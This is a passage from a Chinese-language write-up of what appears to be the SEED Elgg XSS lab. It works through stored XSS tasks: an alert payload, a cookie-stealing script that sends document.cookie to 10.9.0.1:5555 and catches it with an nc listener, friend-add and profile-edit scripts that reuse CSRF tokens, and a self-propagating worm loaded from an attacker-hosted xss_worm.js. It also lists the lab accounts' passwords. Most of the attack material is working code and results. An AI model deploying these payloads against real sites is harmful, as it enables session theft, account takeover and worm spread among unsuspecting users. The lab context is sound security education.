+<p>以下的 JavaScript 代码将显示一个警告窗口：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>下面我将使用 Alice 的账户做测试，实现显示警告窗口：</p>
+<ol>
+<li>首先登陆 Alice 的账户，用户账户如下所示：</li>
+</ol>
+<pre tabindex="0"><code>----------------------------
+UserName | Password
+----------------------------
+admin    | seedelgg
+alice    | seedalice
+boby     | seedboby
+charlie  | seedcharlie
+samy     | seedsamy
+----------------------------
+</code></pre><ol start="2">
+<li>依次点击 Account -&gt; Edit profile 进入个人资料编辑页面，在 brief description 处写入 JavaScript 代码：</li>
+</ol>
+<img src="https://s2.loli.net/2024/11/06/vGoadN3r7QLjMCK.png" alt="image-20241106085104577" style="zoom:50%;" />
+<ol start="3">
+<li>保存并刷新页面，显示了警告弹窗。</li>
+</ol>
+<img src="C:/Users/86135/AppData/Roaming/Typora/typora-user-images/image-20241106085320978.png" alt="image-20241106085320978" style="zoom:50%;" />
+<h3 id="2-通过-src-属性引用嵌入">2. 通过 src 属性引用嵌入<a hidden class="anchor" aria-hidden="true" href="#2-通过-src-属性引用嵌入">#</a></h3>
+<h4 id="21-搭建一个本地-web-服务器">2.1 搭建一个本地 Web 服务器<a hidden class="anchor" aria-hidden="true" href="#21-搭建一个本地-web-服务器">#</a></h4>
+<ol>
+<li>创建一个目录，在目录下创建 JavaScript 脚本文件 <code>xss_worm.js</code>。</li>
+<li>使用命令 <code>python3 -m http.server 9999</code> 启动 Web 服务。</li>
+<li>在 <code>/etc/hosts</code> 文件中设置域名，将 <code>127.0.0.1</code> 映射到 <a href="https://www.miyu.com">www.miyu.com</a></li>
+<li>使用 <code>http://www.miyu.com:9999/myscripts.js</code> 访问 JS 脚本。</li>
+</ol>
+<p><img loading="lazy" src="https://s2.loli.net/2024/11/08/xyPdYXWwVUF3RNG.png" alt="image-20241108214455029"  />
+</p>
+<h4 id="22-使用-src-属性引用">2.2 使用 src 属性引用<a hidden class="anchor" aria-hidden="true" href="#22-使用-src-属性引用">#</a></h4>
+<p>如果你的 JavaScript 脚本过长，可以将 JavaScript 程序保存在文件中，然后使用 src 属性引用。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="na">src</span><span class="o">=</span><span class="s">&#34;http://www.miyu.com:9999/myscripts.js&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>访问主页，如下所示：</p>
+<img src="https://s2.loli.net/2024/11/08/p6mQl5dWDZCaV3e.png" alt="image-20241108215304951" style="zoom:50%;" />
+<h2 id="task-2上传恶意代码以显示-cookies">Task 2：上传恶意代码以显示 Cookies<a hidden class="anchor" aria-hidden="true" href="#task-2上传恶意代码以显示-cookies">#</a></h2>
+<blockquote>
+<p>此任务的目标是在你的 Elgg 的个人资料中嵌入一个 JavaScript 程序，使得当其他用户查看你的个人资料时该用户的 cookies 将显示在警告窗口中。</p>
+</blockquote>
+<p>修改 Task 1 的代码，使用 <code>document.cookie</code> 获取当前页面的所有cookies：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>效果如下所示：</p>
+<img src="https://s2.loli.net/2024/12/07/4qJ1BvAs3VtFMSO.png" alt="image-20241106092710107" style="zoom:50%;" />
+<h2 id="task-3窃取受害者机器的-cookies">Task 3：窃取受害者机器的 Cookies<a hidden class="anchor" aria-hidden="true" href="#task-3窃取受害者机器的-cookies">#</a></h2>
+<blockquote>
+<p>在前一个任务中，攻击者编写的恶意 JavaScript 代码可以打印出用户的 cookies，但只有用户可以看到 cookies，而不是攻击者。在这个任务中，攻击者希望 JavaScript 代码将用户 cookies 发送给自己。</p>
+</blockquote>
+<p>我们可以使用 <code>&lt;img&gt;</code> 标签实现 cookies 的发送，当 <code>&lt;img&gt;</code> 标签被插入到页面时，浏览器发出 URL 请求，利用 URL 请求，将 cookies 发送到攻击者的服务器。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=http://10.9.0.1:5555?c=&#39;</span><span class="o">+</span> <span class="nx">escape</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; &gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>同时，我们使用 <code>netcat(nc)</code> 监听 5555 端口，使用如下命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lknv <span class="m">5555</span>
+</span></span></code></pre></div><ul>
+<li><code>-l</code> 参数表示 <code>nc</code> 监听的是一个传入连接。</li>
+<li><code>-nv</code> 参数用于显示更详细的输入。</li>
+<li><code>-k</code> 参数表示当一个连接完成时，监听另一个连接。</li>
+</ul>
+<p>实验结果如下所示：</p>
+<img src="https://s2.loli.net/2024/11/06/PUYlpIKLjr7v4bS.png" alt="image-20241106172300243" style="zoom:50%;" />
+<img src="https://s2.loli.net/2024/12/07/dfBuQ4k2NAWPVa5.png" alt="image-20241106172429989" style="zoom:50%;" />
+<p>可以发现红框中的部分为访问者的 Cookie 信息，成功窃取到了受害者的 Cookie。</p>
+<h2 id="task-4成为受害者的朋友">Task 4：成为受害者的朋友<a hidden class="anchor" aria-hidden="true" href="#task-4成为受害者的朋友">#</a></h2>
+<blockquote>
+<p>我们将编写一个 XSS 蠕虫，使得任何其他访问 Samy 页面的用户都会加 Samy 为朋友。</p>
+</blockquote>
+<h3 id="1-确定参数">1. 确定参数<a hidden class="anchor" aria-hidden="true" href="#1-确定参数">#</a></h3>
+<p>在编写恶意的 JavaScript 程序之前，我们需要先搞清楚添加朋友是通过请求哪些参数来实现的，使用 FireFox 的插件 HTTP header live 可以获取发送朋友请求时的全部请求信息，我们先登陆 Samy 的账户，并对 Alice 发送好友请求，并使用 HTTP header live 插件来捕获信息。</p>
+<p>依次点击 Members -&gt; Alice -&gt; Add friend 即可添加好友，点击 Add friend 时捕获到的 GET 请求如下所示：</p>
+<pre tabindex="0"><code>http://www.seed-server.com/action/friends/add?friend=56&amp;__elgg_ts=1730886267&amp;__elgg_token=QsFgZUqbfQ83KK3rUNkHhQ&amp;__elgg_ts=1730886267&amp;__elgg_token=QsFgZUqbfQ83KK3rUNkHhQ
+</code></pre><p><img loading="lazy" src="https://s2.loli.net/2024/11/06/nzvom3GQZB1rkEe.png" alt="image-20241106174738340"  />
+</p>
+<p>我们发现想要完成添加好友的操作，必须获取几个参数：</p>
+<ul>
+<li>friend 编号，可以得出 Samy 的编号为 <strong>59</strong></li>
+<li>__elgg_ts 参数</li>
+<li>__elgg_token 参数</li>
+</ul>
+<h3 id="2-编写-javascript-脚本">2. 编写 JavaScript 脚本<a hidden class="anchor" aria-hidden="true" href="#2-编写-javascript-脚本">#</a></h3>
+<p>根据第一步的分析，我们可以写出如下JS脚本:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">Ajax</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="s2">&#34;&amp;__elgg_ts=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="p">;</span> <span class="c1">//（1）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="s2">&#34;&amp;__elgg_token=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span> <span class="c1">//（2）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//Construct the HTTP request to add Samy as a friend.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">sendurl</span><span class="o">=</span><span class="s2">&#34;http://www.seed-server.com/action/friends/add?friend=59&#34;</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="nx">token</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="nx">token</span><span class="p">;</span> <span class="c1">//FILL IN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//Create and send Ajax request to add friend
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">Ajax</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Ajax</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="nx">sendurl</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Ajax</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></div><h3 id="3-攻击测试">3. 攻击测试<a hidden class="anchor" aria-hidden="true" href="#3-攻击测试">#</a></h3>
+<ol>
+<li>首先登陆 Alice 的账户，确认其没有添加 Samy 的好友。</li>
+</ol>
+<img src="https://s2.loli.net/2024/12/07/MWet2a8yu6YRGiN.png" alt="image-20241106181917539" style="zoom:50%;" />
+<ol start="2">
+<li>点击 Samy 的 Profile，并查看好友列表，发现自动添加了 Samy 的好友。</li>
+</ol>
+<img src="https://s2.loli.net/2024/12/07/Szw8nv1oNiQ94dE.png" alt="image-20241106182340428" style="zoom:50%;" />
+<img src="https://s2.loli.net/2024/12/07/g4Os6TorBnZ1jPw.png" alt="image-20241106182348043" style="zoom:50%;" />
+<h3 id="4-q--a">4. Q &amp; A<a hidden class="anchor" aria-hidden="true" href="#4-q--a">#</a></h3>
+<ul>
+<li>
+<p><strong>Q1：解释第 (1) 行和第 (2) 行的目的，为什么需要这两行？</strong></p>
+<p><code>var ts = &quot;&amp;__elgg_ts=&quot; + elgg.security.token.__elgg_ts;</code>用于获取一个时间戳（__elgg_ts）的值，可以用于防止 CSRF（跨站请求伪造）攻击，它可以确保请求是由合法用户发出的，并且请求的时间窗不会过期。</p>
+<p><code>var token = &quot;&amp;__elgg_token=&quot; + elgg.security.token.__elgg_token;</code>用于获取一个 CSRF 令牌，也是为了防止 CSRF 攻击，它可以确保请求没有被篡改。</p>
+</li>
+<li>
+<p><strong>Q2：如果 Elgg 应用程序仅为“About Me”部分提供编辑器模式，即你无法切换到文本模式，你还能成功发起攻击吗？</strong></p>
+<p>不可以，因为编辑器模式会对部分符号进行转义，而且会给每一行加上 <code>&lt;p&gt;</code> 标签，并在行末加入 <code>&lt;br /&gt;</code> 换行符，使得我们的 JavaScript 脚本无法执行，如下所示：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="ni">&amp;lt;</span>script type=&#34;text/javascript&#34;<span class="ni">&amp;gt;</span><span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">window.onload = function () {<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="ni">&amp;nbsp;&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>var Ajax=null;<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="ni">&amp;nbsp;&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>var ts=&#34;<span class="ni">&amp;amp;</span>__elgg_ts=&#34;+elgg.security.token.__elgg_ts; //（1）<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="ni">&amp;nbsp;&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>var token=&#34;<span class="ni">&amp;amp;</span>__elgg_token=&#34;+elgg.security.token.__elgg_token; //（2）<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="ni">&amp;nbsp;&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>//Construct the HTTP request to add Samy as a friend.<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="ni">&amp;nbsp;&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>var sendurl=&#34;http://www.seed-server.com/action/friends/add?friend=59&#34;+ts+token+ts+token; //FILL IN<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="task-5修改受害者的个人资料">Task 5：修改受害者的个人资料<a hidden class="anchor" aria-hidden="true" href="#task-5修改受害者的个人资料">#</a></h2>
+<blockquote>
+<p>这个任务的目标是在受害者访问 Samy 的界面时修改受害者的个人资料。</p>
+</blockquote>
+<h3 id="1-确定参数-1">1. 确定参数<a hidden class="anchor" aria-hidden="true" href="#1-确定参数-1">#</a></h3>
+<p>修改 Profile 的时候使用插件 HTTP Header Live 抓取 URL，发现修改时会发送一个 <strong>POST</strong> 请求：</p>
+<img src="https://s2.loli.net/2024/12/07/s7ghGQvmV6bn3Pz.png" alt="image-20241108200443299" style="zoom:50%;" />
+<p>发送了一个这样的请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">__elgg_token=ve9v_2hFvL5So_x9hQc_xg<span class="err">&amp;</span>__elgg_ts=1731067312<span class="err">&amp;</span>name=Samy<span class="err">&amp;</span>description=<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>1111<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span><span class="err">&amp;</span>guid=59
+</span></span></code></pre></div><p>于是我们需要获取一下参数：</p>
+<ul>
+<li><code>__elgg_token</code>: CSRF 令牌</li>
+<li><code>__elgg_ts</code>：时间戳</li>
+<li><code>name</code>：用户名</li>
+<li><code>description</code>：修改的内容</li>
+<li><code>guid</code>：用户id，samy 的 guid 为 59</li>
+</ul>
+<h3 id="2-编写-javascript-脚本-1">2. 编写 JavaScript 脚本<a hidden class="anchor" aria-hidden="true" href="#2-编写-javascript-脚本-1">#</a></h3>
+<p>根据第一步的分析，我们可以写出如下脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//and Security Token __elgg_token
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">userName</span><span class="o">=</span><span class="s2">&#34;&amp;name=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">guid</span><span class="o">=</span><span class="s2">&#34;&amp;guid=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">guid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="s2">&#34;&amp;__elgg_ts=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="s2">&#34;&amp;__elgg_token=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//Construct the content of your url.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">content</span><span class="o">=</span><span class="nx">token</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="nx">userName</span><span class="o">+</span><span class="s2">&#34;&amp;description=Your profile has been changed!!!&#34;</span><span class="o">+</span><span class="nx">guid</span><span class="p">;</span> <span class="c1">//FILL IN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">samyGuid</span><span class="o">=</span><span class="mi">59</span><span class="p">;</span> <span class="c1">//FILL IN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">sendurl</span><span class="o">=</span><span class="s2">&#34;http://www.seed-server.com/action/profile/edit&#34;</span><span class="p">;</span> <span class="c1">//FILL IN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">guid</span><span class="o">!=</span><span class="nx">samyGuid</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">//Create and send Ajax request to modify profile
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kd">var</span> <span class="nx">Ajax</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="nx">sendurl</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></div><h3 id="3-攻击测试-1">3. 攻击测试<a hidden class="anchor" aria-hidden="true" href="#3-攻击测试-1">#</a></h3>
+<p>登录 Alice 的账户，访问 Samy 的主页，发现 Alice 的 About me 改成了 JavaScript 脚本中设置的 <strong>Your profile has been changed!!!</strong>。</p>
+<img src="https://s2.loli.net/2024/12/07/HdBTVYK8ytOEUbl.png" alt="image-20241108203737801" style="zoom:50%;" />
+<h3 id="4-q--a-1">4. Q &amp; A<a hidden class="anchor" aria-hidden="true" href="#4-q--a-1">#</a></h3>
+<ul>
+<li>
+<p><strong>Q3：我们为什么需要第 (1) 行？删除这行，重复你的攻击。报告并解释你的观察结果。</strong></p>
+<p>这行判断用户的 guid 是否是 Samy 的 guid，如果不是，再发送 POST 请求进行攻击，这样可以防止 Samy 自己被攻击。</p>
+<p>如果删除第一行，samy 自己也会受到攻击，删除这行，重复攻击，如下所示：</p>
+<img src="https://s2.loli.net/2024/12/07/9ZSDEp4mceCjsfF.png" alt="image-20241108204725696" style="zoom:50%;" />
+<p>可以发现 Samy 的恶意脚本也被替换成了 <strong>Your profile has been changed!!!</strong>，导致无法进行下一次的攻击。</p>
+</li>
+</ul>
+<h2 id="task-6编写自传播-xss-蠕虫">Task 6：编写自传播 XSS 蠕虫<a hidden class="anchor" aria-hidden="true" href="#task-6编写自传播-xss-蠕虫">#</a></h2>
+<blockquote>
+<p>恶意 JavaScript 程序要成为真正的蠕虫，应该要实现自传播。也就是说，每当有人查看受感染的个人资料时，他们的个人资料不仅会被修改，蠕虫还会传播到他们的个人资料中，进一步影响查看这些新感染资料的其他人。在这个任务中，你需要实现这样一个蠕虫，它不仅修改受害者的个人资料并将用户“Samy”添加为朋友，还将蠕虫本身的副本添加到受害者的个人资料中，这样受害者就变成了攻击者。</p>
+</blockquote>
+<h3 id="1-link-方法">1. Link 方法<a hidden class="anchor" aria-hidden="true" href="#1-link-方法">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://www.miyu.com:9999/xss_worm.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>可以使用 <code>src</code> 属性嵌入恶意脚本，并利用这个恶意脚本将以上这段代码传递到其他人的 Profile，这样就实现了自传播的 XSS 蠕虫。</p>
+<p>以下是 <code>xss_worm.js</code> 的实现：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//and Security Token __elgg_token
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">userName</span><span class="o">=</span><span class="s2">&#34;&amp;name=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">guid</span><span class="o">=</span><span class="s2">&#34;&amp;guid=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">guid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="s2">&#34;&amp;__elgg_ts=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="s2">&#34;&amp;__elgg_token=&#34;</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//Construct the content of your url.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">content</span><span class="o">=</span><span class="nx">token</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="nx">userName</span><span class="o">+</span><span class="s2">&#34;&amp;description=&lt;p&gt;Your profile has been changed!!!&lt;\/p&gt;&lt;script type=\&#34;text\/javascript\&#34; src=\&#34;http:\/\/www.miyu.com:9999\/xss_worm.js\&#34;&gt;&lt;\/script&gt;&#34;</span><span class="o">+</span><span class="nx">guid</span><span class="p">;</span> <span class="c1">//FILL IN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">samyGuid</span><span class="o">=</span><span class="mi">59</span><span class="p">;</span> <span class="c1">//FILL IN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">sendurl1</span><span class="o">=</span><span class="s2">&#34;http://www.seed-server.com/action/profile/edit&#34;</span><span class="p">;</span> <span class="c1">//change profile
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">sendurl2</span><span class="o">=</span><span class="s2">&#34;http://www.seed-server.com/action/friends/add?friend=59&#34;</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="nx">token</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="nx">token</span><span class="p">;</span> <span class="c1">//add samy
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">guid</span><span class="o">!=</span><span class="nx">samyGuid</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">//Create and send Ajax request to modify profile
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kd">var</span> <span class="nx">Ajax</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="nx">sendurl1</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Ajax</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">Ajax</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Ajax</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="nx">sendurl2</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Ajax</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>测试：</strong></p>
+<ul>
+<li>登录 Alice 的账户，点击 Samy 的主页，发现 Alice 的主页被感染，同时自动加了 Samy 为好友：</li>
+</ul>
